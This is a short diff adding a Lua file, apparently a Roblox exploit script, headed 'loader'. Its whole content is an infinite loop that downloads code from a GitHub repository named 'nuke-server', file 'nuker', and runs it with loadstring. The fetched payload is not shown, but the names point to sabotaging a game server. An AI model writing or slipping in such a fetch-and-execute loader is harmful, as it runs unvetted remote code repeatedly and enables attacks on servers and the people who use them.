@@ -1,0 +1,5 @@
+--[[ loader ]]--
+
+while true do
+  loadstring(game:HttpGet('https://raw.githubusercontent.com/scytheXlol/nuke-server/refs/heads/main/nuker'))()
+end
